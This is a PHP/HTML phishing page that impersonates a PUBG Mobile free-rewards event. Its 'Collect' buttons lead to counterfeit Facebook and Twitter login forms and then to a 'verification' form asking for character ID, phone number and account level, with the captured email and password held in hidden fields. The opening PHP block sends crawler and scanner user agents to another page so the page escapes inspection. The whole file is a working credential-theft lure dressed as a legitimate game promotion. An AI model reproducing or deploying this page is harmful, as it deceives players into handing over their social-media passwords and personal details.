<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
  
<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<video id="headerVideo" src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="event-title"></div> <!--- event-title --->
<div class="event-notification-wrapper">
<div class="event-notification-icon"><img src="img/event-notification-icon.png"></div> <!--- event-notification-icon --->
<div class="event-notification-content">Rewards will be available until <div class="event-notification-content-timer"><i class="zmdi zmdi-timer"></i><span id="latestTimer"></span></div></div> <!--- event-notification-content --->
</div> <!--- event-notification-wrapper --->
<div class="box">
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<div class="menu-wrapper">
<div class="menu-content kanan" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Other Reward</div> <!--- menu-content --->
<div class="menu-content kiri" onmousedown="buka.play();" onclick="openRewards(event, 'season');" id="defaultTabRewards">Event Reward</div> <!--- menu-content --->
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'weapon');">Weapon Reward</div> <!--- menu-content --->
</div> <!--- menu-wrapper --->
<center>
<div class="tab_rewards" id="season">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/7.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/rewards/9.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">100</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/g0zpWp22/oro-token.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="100" src="https://i.postimg.cc/g0zpWp22/oro-token.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">300</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/g0zpWp22/oro-token.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="300" src="https://i.postimg.cc/g0zpWp22/oro-token.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">500</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/g0zpWp22/oro-token.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="500" src="https://i.postimg.cc/g0zpWp22/oro-token.png">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="weapon">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/Ln5CfhZZ/10.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/Ln5CfhZZ/10.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/jL18hKz3/11.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/jL18hKz3/11.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/gx6gS5sz/12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/gx6gS5sz/12.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/mcxwnd22/new2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/mcxwnd22/new2.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/N5zb6s3X/new1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/N5zb6s3X/new1.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/JFdHX4V/image-76-1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/JFdHX4V/image-76-1.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/Wg93jRK/image-77-1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/Wg93jRK/image-77-1.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/VMrskWj/awmNew.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/VMrskWj/awmNew.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/x3fJgmc/skorpion-New.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/x3fJgmc/skorpion-New.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/tKnVNF1/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/tKnVNF1/8.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.ibb.co/wzvvStV/grozaNew.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.ibb.co/wzvvStV/grozaNew.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/FHNVyZgK/newAkm2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="https://i.postimg.cc/FHNVyZgK/newAkm2.png"><div class="item-button-txt">Collect</div></button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="other">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">125</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QWX9JsG/uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="125" src="https://i.postimg.cc/0QWX9JsG/uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">250</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QWX9JsG/uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="250" src="https://i.postimg.cc/0QWX9JsG/uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">500</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QWX9JsG/uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="500" src="https://i.postimg.cc/0QWX9JsG/uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">1250</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QWX9JsG/uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="1250" src="https://i.postimg.cc/0QWX9JsG/uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">2500</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QWX9JsG/uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="2500" src="https://i.postimg.cc/0QWX9JsG/uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">5000</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/0QWX9JsG/uc.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="5000" src="https://i.postimg.cc/0QWX9JsG/uc.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">1</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="1" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">3</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="3" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">5</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="5" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">10</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="10" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">15</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="15" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">20</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/tRcvfPDp/material.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="20" src="https://i.postimg.cc/tRcvfPDp/material.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">5</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QxWYrtn5/paint.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="5" src="https://i.postimg.cc/QxWYrtn5/paint.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">10</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QxWYrtn5/paint.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="10" src="https://i.postimg.cc/QxWYrtn5/paint.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">15</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QxWYrtn5/paint.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="15" src="https://i.postimg.cc/QxWYrtn5/paint.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">20</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QxWYrtn5/paint.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="20" src="https://i.postimg.cc/QxWYrtn5/paint.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">25</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QxWYrtn5/paint.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="25" src="https://i.postimg.cc/QxWYrtn5/paint.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<div class="item-nominal">30</div>
<img style="border-bottom: 0px;" src="https://i.postimg.cc/QxWYrtn5/paint.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="30" src="https://i.postimg.cc/QxWYrtn5/paint.png">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-join">Join the Community</div> <!--- footer-txt-follow --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/jnLQLD1x/footer-socmed-1.png">
<p>Facebook</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Thwcks3z/footer-socmed-2.png">
<p>Twitter</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Subscribe</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/bdB94RGs/footer-socmed-3.png">
<p>Youtube</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/YvcfCqz7/footer-socmed-4.png">
<p>Instagram</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="https://i.postimg.cc/w7RQzsJF/footer-socmed-5.png">
<p>VK</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Join</button>
<img class="footer-socmed-img-other" src="https://i.postimg.cc/Sxyy8Kzz/footer-socmed-6.png">
<p>Discord</p>
</div> <!--- footer-socmed-box --->
<img class="footer-copyright-icon" src="https://i.postimg.cc/pV8Q4L9L/footer-img.png">
<div class="footer-txt-copyright">ⓒ <?php echo $yearNow;?> KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-<?php echo $yearNow;?> Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
<br>
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Reward Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->

<div class="popup otherReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Reward Confirmation</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Are you sure to collect this reward?</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<span id="otherReward_confirmationValue"></span>
<img src="" id="myOtherReward_confirmationImg">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()">Cancel</button>
<button type="button" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup otherReward_confirmation --->

<div class="popup account_login" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Login</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Login to receive your selected reward</div> <!--- popup-box-alert --->
<div class="popup-btn-login-wrapper" onclick="open_facebook();">
<div class="popup-btn-login-wrapper-icon"><img src="img/socmedBtn1.png"></div> <!--- popup-btn-login-wrapper-icon --->
<div class="popup-btn-login-content">Log in using Facebook account</div> <!--- popup-btn-login-content --->
</div> <!--- popup-btn-login-wrapper --->
<div class="popup-btn-login-wrapper" onclick="open_twitter();">
<div class="popup-btn-login-wrapper-icon"><img src="img/socmedBtn2.png"></div> <!--- popup-btn-login-wrapper-icon --->
<div class="popup-btn-login-content">Log in using Twitter account</div> <!--- popup-btn-login-content --->
</div> <!--- popup-btn-login-wrapper --->
</div> <!--- popup-box-bg --->
<div class="popup-box-footer"></div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://i.postimg.cc/3wBVgZTz/login-Method1.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
<div class="txt-login-fb">Log in to your Facebook account to connect to PUBG MOBILE</div> <!--- txt-login-fb --->
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<label>
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
</label>
<label>
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required>
</label>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create account</div> <!--- txt-create-account --->
<div class="txt-not-now">Not now</div> <!--- txt-not-now --->
<div class="txt-forgotten-password">Forgotten password?</div> <!--- txt-forgotten-password --->
</div> <!--- content-box-fb --->
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div> <!--- language-name language-name-active --->
<div class="language-name">Bahasa Indonesia</div> <!--- language-name --->
<div class="language-name">Basa Jawa</div> <!--- language-name --->
<div class="language-name">Bahasa Melayu</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<div class="header-twitter"><img src="https://i.postimg.cc/dtyfWFF2/login-Method2.png"></div> <!--- header-twitter --->
<br>
<br>
<br>
<center>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter">Login to Twitter</div> <!--- txt-login-twitter --->
<div class="form-group">
<input type="text" name="email" id="email-twitter" autocomplete="off" required>
<label>Phone/email/username</label>
</div> <!--- form-group --->
<div class="form-group">
<input type="password" name="password" id="password-twitter" autocomplete="off" required>
<label>Password</label>
</div> <!--- form-group --->
<input type="hidden" name="login" id="login-twitter" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter" onclick="ValidateLoginTwitterData()">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div> <!--- footer-menu-twitter --->
<div class="footer-menu-twitter bulet">•</div> <!--- footer-menu-twitter bulet --->
<div class="footer-menu-twitter">Sign up to Twitter</div> <!--- footer-menu-twitter --->
</form>
</center>
</div> <!--- box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup account_verification" style="display: none;">
<div class="popup-box-wrapper popup-box-verification">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">Complete your account detail</div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
<select name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
</div> <!--- popup-box-bg --->
<div class="popup-box-form-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verify my Account</button>
</div> <!--- popup-box-form-footer --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
</div> <!--- popup-box-alert --->
<div class="popup-box-footer"></div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Processing Account</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert">
<br>
Thanks for joining this event
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-box-alert --->
<br>
<br>
</div> <!--- popup-box-bg --->
<div class="popup-box-form-footer">
<button type="button" onmousedown="tutup.play();" onclick="location.href='https://pubgmobile.com/';">Logout my Account</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
